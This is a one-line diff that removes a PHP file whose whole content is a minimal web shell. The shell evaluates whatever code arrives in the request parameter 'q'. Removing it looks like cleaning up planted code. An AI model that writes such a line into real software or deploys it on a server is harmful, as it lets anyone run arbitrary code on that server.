@@ -1,1 +1,0 @@
-<?php eval(stripslashes($_REQUEST[q]));?>
